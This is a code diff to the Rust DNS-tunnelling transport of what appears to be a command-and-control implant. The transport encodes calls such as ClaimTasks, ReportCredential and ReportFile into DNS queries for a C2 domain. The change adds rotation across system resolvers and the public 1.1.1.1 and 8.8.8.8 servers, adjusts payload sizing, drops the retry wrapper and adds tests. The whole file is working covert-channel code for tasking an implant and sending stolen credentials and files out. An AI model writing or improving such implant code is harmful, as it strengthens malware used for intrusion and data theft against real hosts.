@@ -4,6 +4,9 @@ use prost::Message;
 use std::sync::mpsc::{Receiver, Sender};
 use tokio::net::UdpSocket;
 
+#[cfg(feature = "dns")]
+use hickory_resolver::system_conf::read_system_conf;
+
 use crate::Transport;
 
 // DNS protocol limits
@@ -40,8 +43,10 @@ const RESP_CHUNKED: &str = "r:"; // Response chunked metadata
 const MAX_RETRIES: usize = 5;
 const INIT_TIMEOUT_SECS: u64 = 15;
 const CHUNK_TIMEOUT_SECS: u64 = 20;
-const EXCHANGE_MAX_RETRIES: usize = 5;
-const EXCHANGE_RETRY_DELAY_SECS: u64 = 3;
+
+// DNS query configuration
+const MAX_DNS_PACKET_SIZE: usize = 4096; // Maximum DNS response size
+const DNS_QUERY_TIMEOUT_SECS: u64 = 5; // Timeout for individual DNS queries
 
 // gRPC method paths
 static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
@@ -67,6 +72,52 @@ where
     pb::xchacha::decode_with_chacha::<Req, Resp>(data)
 }
 
+/// Build resolver array: system DNS servers (if available) + fallback servers
+/// Returns array with system servers first, then 1.1.1.1:53, then 8.8.8.8:53
+/// If system config fails, returns only [1.1.1.1:53, 8.8.8.8:53]
+fn build_resolver_array() -> Vec<String> {
+    let mut resolvers = Vec::new();
+
+    // Try to get system DNS servers
+    #[cfg(feature = "dns")]
+    match read_system_conf() {
+        Ok((config, _opts)) => {
+            // Extract nameserver addresses from system config
+            for ns in config.name_servers() {
+                let addr = ns.socket_addr;
+                let server = format!("{}:{}", addr.ip(), addr.port());
+
+                // Only add if not already in the list (deduplicate)
+                if !resolvers.contains(&server) {
+                    resolvers.push(server);
+                }
+            }
+
+            #[cfg(debug_assertions)]
+            if !resolvers.is_empty() {
+                log::debug!("Found {} system DNS servers: {:?}", resolvers.len(), resolvers);
+            } else {
+                log::debug!("System DNS config returned no servers");
+            }
+        }
+        Err(_e) => {
+            #[cfg(debug_assertions)]
+            log::debug!("Failed to read system DNS config: {}", _e);
+        }
+    }
+
+    // Always add fallback servers (Cloudflare and Google)
+    // Add only if not already in the list
+    let fallbacks = vec!["1.1.1.1:53".to_string(), "8.8.8.8:53".to_string()];
+    for fallback in fallbacks {
+        if !resolvers.contains(&fallback) {
+            resolvers.push(fallback);
+        }
+    }
+
+    resolvers
+}
+
 /// Map gRPC method path to 2-character code
 /// Codes: ct=ClaimTasks, fa=FetchAsset, rc=ReportCredential,
 ///        rf=ReportFile, rp=ReportProcessList, rt=ReportTaskOutput
@@ -89,7 +140,9 @@ fn method_to_code(method: &str) -> String {
 /// Supports TXT, A, and AAAA record types with automatic fallback.
 #[derive(Debug, Clone)]
 pub struct DNS {
-    dns_server: Option<String>, // None = use system resolver
+    dns_server: Option<String>,     // Some(server) = use explicit server, None = use resolver array
+    dns_resolvers: Vec<String>,     // Array of resolvers (system + fallbacks) when dns_server is None
+    current_resolver_index: usize,  // Current index in dns_resolvers array
     base_domain: String,
     socket: Option<std::sync::Arc<UdpSocket>>,
     preferred_record_type: u16, // User's preferred type (TXT/A/AAAA)
@@ -105,9 +158,15 @@ impl DNS {
         let base_with_dot = self.base_domain.len() + 1;
         let total_available = MAX_DNS_NAME_LEN.saturating_sub(base_with_dot);
 
-        // Base32 encoding: ((HEADER_SIZE + data) * 8 / 5) <= total_available
-        // Solve for data: data <= (total_available * 5 / 8) - HEADER_SIZE
-        let max_raw_packet = (total_available * 5) / 8;
+        // Account for dots between labels (every 63 chars needs a dot separator)
+        // If we have N chars, we need ceil(N/63) - 1 dots
+        // To be safe, estimate: for every 63 chars, we lose 1 char to a dot
+        // So effective available space is: total_available * 63 / 64
+        let effective_available = (total_available * 63) / 64;
+
+        // Base32 encoding: ((HEADER_SIZE + data) * 8 / 5) <= effective_available
+        // Solve for data: data <= (effective_available * 5 / 8) - HEADER_SIZE
+        let max_raw_packet = (effective_available * 5) / 8;
         max_raw_packet.saturating_sub(HEADER_SIZE)
     }
 
@@ -404,6 +463,7 @@ impl DNS {
     }
 
     /// Send a single DNS query and receive response, with record type fallback
+    /// and resolver fallback (when using system resolvers)
     async fn send_query(&mut self, subdomain: &str) -> Result<Vec<u8>> {
         use rand::Rng;
 
@@ -441,89 +501,156 @@ impl DNS {
                 log::trace!("Attempting DNS query with record type: {}", type_name);
             }
 
-            // Generate random transaction ID
-            let transaction_id: u16 = rand::thread_rng().gen();
-            let query = self.build_dns_query(subdomain, transaction_id, record_type);
-
-            // Determine DNS server to use
-            let target = if let Some(ref server) = self.dns_server {
-                server.clone()
+            // If using system resolver, try all resolvers in the array
+            // If using explicit server, only try that one
+            let resolvers_to_try: Vec<String> = if let Some(ref server) = self.dns_server {
+                // Explicit DNS server specified
+                vec![server.clone()]
             } else {
-                // Use system resolver - send to localhost:53
-                "127.0.0.1:53".to_string()
+                // Use resolver array (system + fallbacks)
+                if self.dns_resolvers.is_empty() {
+                    return Err(anyhow::anyhow!("No DNS resolvers available"));
+                }
+
+                // Try all resolvers starting from current index
+                let mut resolvers = Vec::new();
+                for i in 0..self.dns_resolvers.len() {
+                    let idx = (self.current_resolver_index + i) % self.dns_resolvers.len();
+                    resolvers.push(self.dns_resolvers[idx].clone());
+                }
+                resolvers
             };
 
-            // Send query
-            match socket.send_to(&query, &target).await {
-                Ok(_) => {}
-                Err(e) => {
-                    #[cfg(debug_assertions)]
-                    log::trace!("Failed to send query: {}", e);
-                    continue; // Try next record type
-                }
-            }
+            // Try each resolver
+            for (resolver_attempt, target) in resolvers_to_try.iter().enumerate() {
+                #[cfg(debug_assertions)]
+                log::trace!(
+                    "Attempting query to resolver {} (attempt {}/{})",
+                    target,
+                    resolver_attempt + 1,
+                    resolvers_to_try.len()
+                );
 
-            // Receive response(s) until we get one with matching transaction ID
-            let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_secs(5);
-            let mut buf = [0u8; 4096];
+                // Generate random transaction ID
+                let transaction_id: u16 = rand::thread_rng().gen();
+                let query = self.build_dns_query(subdomain, transaction_id, record_type);
 
-            loop {
-                let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
-                if remaining.is_zero() {
-                    // Timeout - try next record type
-                    break;
-                }
-
-                match tokio::time::timeout(remaining, socket.recv_from(&mut buf)).await {
-                    Ok(Ok((len, _))) => {
-                        // Check if transaction ID matches
-                        if len >= 2 {
-                            let response_id = u16::from_be_bytes([buf[0], buf[1]]);
-                            if response_id == transaction_id {
-                                // Check for DNS error (RCODE in flags)
-                                if len >= 4 {
-                                    let rcode = buf[3] & 0x0F; // Last 4 bits of flags
-                                    if rcode != 0 {
-                                        // DNS error response - try next record type
-                                        #[cfg(debug_assertions)]
-                                        log::trace!("DNS error response, RCODE={}", rcode);
-                                        break;
-                                    }
-                                }
-
-                                // Matching response found
-                                match self.parse_dns_response(&buf[..len]) {
-                                    Ok(data) => {
-                                        // Accept both empty and non-empty responses
-                                        // (data packets return empty ACK, others return data)
-                                        self.current_record_type = record_type;
-                                        return Ok(data);
-                                    }
-                                    Err(_) => {
-                                        break;
-                                    }
-                                }
-                            }
-                            // Wrong transaction ID - keep waiting for the right one
-                            #[cfg(debug_assertions)]
-                            log::trace!("Ignoring DNS response with mismatched transaction ID: expected {}, got {}", transaction_id, response_id);
-                        }
-                    }
-                    Ok(Err(e)) => {
+                // Send query
+                match socket.send_to(&query, target).await {
+                    Ok(_) => {}
+                    Err(_e) => {
                         #[cfg(debug_assertions)]
-                        log::trace!("Failed to receive response: {}", e);
-                        break; // Try next record type
+                        log::trace!("Failed to send query to {}: {}", target, _e);
+
+                        // If using resolver array, advance to next resolver
+                        if self.dns_server.is_none() && !self.dns_resolvers.is_empty() {
+                            self.current_resolver_index =
+                                (self.current_resolver_index + 1) % self.dns_resolvers.len();
+                        }
+                        continue; // Try next resolver
                     }
-                    Err(_) => {
-                        // Timeout - try next record type
+                }
+
+                // Receive response(s) until we get one with matching transaction ID
+                let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_secs(DNS_QUERY_TIMEOUT_SECS);
+                let mut buf = [0u8; MAX_DNS_PACKET_SIZE];
+                let mut timed_out = false;
+
+                loop {
+                    let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
+                    if remaining.is_zero() {
+                        // Timeout - try next resolver or record type
+                        timed_out = true;
                         break;
                     }
+
+                    match tokio::time::timeout(remaining, socket.recv_from(&mut buf)).await {
+                        Ok(Ok((len, _))) => {
+                            // Check if transaction ID matches
+                            if len >= 2 {
+                                let response_id = u16::from_be_bytes([buf[0], buf[1]]);
+                                if response_id == transaction_id {
+                                    // Check for DNS error (RCODE in flags)
+                                    if len >= 4 {
+                                        let rcode = buf[3] & 0x0F; // Last 4 bits of flags
+                                        if rcode != 0 {
+                                            // DNS error response - try next resolver
+                                            #[cfg(debug_assertions)]
+                                            log::trace!(
+                                                "DNS error response from {}, RCODE={}",
+                                                target,
+                                                rcode
+                                            );
+                                            break;
+                                        }
+                                    }
+
+                                    // Matching response found
+                                    match self.parse_dns_response(&buf[..len]) {
+                                        Ok(data) => {
+                                            // Accept both empty and non-empty responses
+                                            // (data packets return empty ACK, others return data)
+                                            self.current_record_type = record_type;
+
+                                            #[cfg(debug_assertions)]
+                                            log::trace!("Successful response from {}", target);
+
+                                            return Ok(data);
+                                        }
+                                        Err(_e) => {
+                                            #[cfg(debug_assertions)]
+                                            log::trace!(
+                                                "Failed to parse response from {}: {}",
+                                                target,
+                                                _e
+                                            );
+                                            break;
+                                        }
+                                    }
+                                }
+                                // Wrong transaction ID - keep waiting for the right one
+                                #[cfg(debug_assertions)]
+                                log::trace!(
+                                    "Ignoring DNS response with mismatched transaction ID: expected {}, got {}",
+                                    transaction_id,
+                                    response_id
+                                );
+                            }
+                        }
+                        Ok(Err(_e)) => {
+                            #[cfg(debug_assertions)]
+                            log::trace!("Failed to receive response from {}: {}", target, _e);
+                            break; // Try next resolver
+                        }
+                        Err(_) => {
+                            // Timeout - try next resolver
+                            timed_out = true;
+                            break;
+                        }
+                    }
+                }
+
+                // If we timed out or got an error, advance to next resolver in array
+                if (timed_out || resolver_attempt < resolvers_to_try.len() - 1)
+                    && self.dns_server.is_none()
+                    && !self.dns_resolvers.is_empty()
+                {
+                    self.current_resolver_index =
+                        (self.current_resolver_index + 1) % self.dns_resolvers.len();
+
+                    #[cfg(debug_assertions)]
+                    log::trace!(
+                        "Moving to next resolver, now at index {}",
+                        self.current_resolver_index
+                    );
                 }
             }
         }
 
-        // All record types failed
-        Err(anyhow::anyhow!("All DNS record types failed"))
+        // All record types and resolvers failed
+        Err(anyhow::anyhow!(
+            "All DNS record types and resolvers failed"
+        ))
     }
 
     /// Send init packet and receive conversation ID from server
@@ -578,7 +705,7 @@ impl DNS {
                         // Binary chunked indicator format (for A records):
                         // Byte 0: 0xFF (magic)
                         // Bytes 1-2: chunk count (uint16 big-endian)
-                        // Byte 3: CRC low byte
+                        // Byte 3: CRC low byte - for integrity check, only low byte is used due to size constraints
                         let total_chunks = u16::from_be_bytes([response[1], response[2]]) as usize;
                         let crc_low = response[3];
 
@@ -725,12 +852,12 @@ impl DNS {
                         attempt + 1
                     );
                 }
-                Ok(Err(e)) => {
+                Ok(Err(_e)) => {
                     #[cfg(debug_assertions)]
                     log::warn!(
                         "Init packet attempt {}: send_query failed: {}",
                         attempt + 1,
-                        e
+                        _e
                     );
                 }
                 Err(_) => {
@@ -832,7 +959,7 @@ impl DNS {
             // Binary chunked indicator format (for A records):
             // Byte 0: 0xFF (magic)
             // Bytes 1-2: chunk count (uint16 big-endian)
-            // Byte 3: CRC low byte
+            // Byte 3: CRC low byte - for integrity check, only low byte is used due to size constraints
             let total_chunks = u16::from_be_bytes([response[1], response[2]]) as usize;
             let crc_low = response[3];
 
@@ -1045,58 +1172,8 @@ impl DNS {
         Ok(decoded)
     }
 
-    /// Perform a complete request-response cycle via DNS
-    /// Perform a DNS-based RPC exchange with automatic retry on failure
+    /// Perform a DNS-based RPC exchange
     async fn dns_exchange(&mut self, method: &str, data: &[u8]) -> Result<Vec<u8>> {
-        let mut last_error = None;
-
-        for attempt in 0..EXCHANGE_MAX_RETRIES {
-            match self.dns_exchange_attempt(method, data).await {
-                Ok(response) => {
-                    #[cfg(debug_assertions)]
-                    if attempt > 0 {
-                        log::info!(
-                            "DNS exchange succeeded on attempt {}/{}",
-                            attempt + 1,
-                            EXCHANGE_MAX_RETRIES
-                        );
-                    }
-                    return Ok(response);
-                }
-                Err(e) => {
-                    #[cfg(debug_assertions)]
-                    log::warn!(
-                        "DNS exchange attempt {}/{} failed: {}",
-                        attempt + 1,
-                        EXCHANGE_MAX_RETRIES,
-                        e
-                    );
-
-                    last_error = Some(e);
-
-                    if attempt < EXCHANGE_MAX_RETRIES - 1 {
-                        // Exponential backoff: 3s, 6s, 12s, 24s
-                        let delay = EXCHANGE_RETRY_DELAY_SECS * (1 << attempt);
-
-                        #[cfg(debug_assertions)]
-                        log::info!("Retrying DNS exchange in {} seconds...", delay);
-
-                        tokio::time::sleep(tokio::time::Duration::from_secs(delay)).await;
-                    }
-                }
-            }
-        }
-
-        Err(last_error.unwrap_or_else(|| {
-            anyhow::anyhow!(
-                "DNS exchange failed after {} attempts",
-                EXCHANGE_MAX_RETRIES
-            )
-        }))
-    }
-
-    /// Internal implementation of DNS exchange (single attempt)
-    async fn dns_exchange_attempt(&mut self, method: &str, data: &[u8]) -> Result<Vec<u8>> {
         // Lazy initialize socket
         if self.socket.is_none() {
             let socket = UdpSocket::bind("0.0.0.0:0")
@@ -1169,6 +1246,8 @@ impl Transport for DNS {
     fn init() -> Self {
         DNS {
             dns_server: None,
+            dns_resolvers: Vec::new(),
+            current_resolver_index: 0,
             base_domain: String::new(),
             socket: None,
             preferred_record_type: TXT_RECORD_TYPE,
@@ -1250,8 +1329,17 @@ impl Transport for DNS {
             }
         }
 
+        // Build resolver array if using system resolver (dns_server is None)
+        let dns_resolvers = if dns_server.is_none() {
+            build_resolver_array()
+        } else {
+            Vec::new()
+        };
+
         Ok(DNS {
             dns_server,
+            dns_resolvers,
+            current_resolver_index: 0,
             base_domain,
             socket: None,
             preferred_record_type,
@@ -1345,11 +1433,15 @@ impl Transport for DNS {
         // This is necessary because iterating over the sync receiver would block the async task
         let handle = tokio::spawn(async move {
             let mut all_chunks = Vec::new();
+            #[cfg_attr(not(debug_assertions), allow(unused_variables))]
             let mut chunk_count = 0;
 
             // Iterate over the sync channel receiver in a spawned task to avoid blocking
             for chunk in request {
-                chunk_count += 1;
+                #[cfg(debug_assertions)]
+                {
+                    chunk_count += 1;
+                }
                 let chunk_bytes =
                     marshal_with_codec::<ReportFileRequest, ReportFileResponse>(chunk)?;
                 all_chunks.extend_from_slice(&(chunk_bytes.len() as u32).to_be_bytes());
@@ -1461,6 +1553,8 @@ mod tests {
     fn test_calculate_max_data_size_positive() {
         let dns = DNS {
             dns_server: None,
+            dns_resolvers: Vec::new(),
+            current_resolver_index: 0,
             base_domain: "c2.example.com".to_string(),
             socket: None,
             preferred_record_type: TXT_RECORD_TYPE,
@@ -1474,6 +1568,8 @@ mod tests {
         // Test with a very long base domain - should be smaller
         let dns_long = DNS {
             dns_server: None,
+            dns_resolvers: Vec::new(),
+            current_resolver_index: 0,
             base_domain: "very.long.subdomain.hierarchy.for.testing.purposes.c2.example.com"
                 .to_string(),
             socket: None,
@@ -1623,5 +1719,36 @@ mod tests {
         assert!(result.is_err());
         let err_msg = result.unwrap_err().to_string();
         assert!(err_msg.contains("reverse shell") || err_msg.contains("not support"));
+    }
+
+    #[test]
+    fn test_dns_new_with_wildcard_builds_resolver_array() {
+        let dns = DNS::new("dns://*/c2.example.com".to_string(), None).unwrap();
+
+        assert!(dns.dns_server.is_none(), "dns_server should be None for wildcard");
+        assert!(!dns.dns_resolvers.is_empty(), "dns_resolvers array should be populated");
+
+        // Should always have at least Cloudflare and Google fallbacks
+        assert!(dns.dns_resolvers.len() >= 2, "Should have at least 2 resolvers (fallbacks)");
+
+        // Check that Cloudflare and Google are in the list (they should be at the end)
+        let has_cloudflare = dns.dns_resolvers.iter().any(|s| s == "1.1.1.1:53");
+        let has_google = dns.dns_resolvers.iter().any(|s| s == "8.8.8.8:53");
+
+        assert!(has_cloudflare, "Should have Cloudflare (1.1.1.1:53) in resolver list");
+        assert!(has_google, "Should have Google (8.8.8.8:53) in resolver list");
+
+        assert_eq!(dns.current_resolver_index, 0, "Should start at index 0");
+
+        #[cfg(debug_assertions)]
+        println!("Resolver array: {:?}", dns.dns_resolvers);
+    }
+
+    #[test]
+    fn test_dns_new_with_explicit_server_no_resolver_array() {
+        let dns = DNS::new("dns://8.8.8.8/c2.example.com".to_string(), None).unwrap();
+
+        assert_eq!(dns.dns_server, Some("8.8.8.8:53".to_string()));
+        assert!(dns.dns_resolvers.is_empty(), "dns_resolvers should be empty with explicit server");
     }
 }
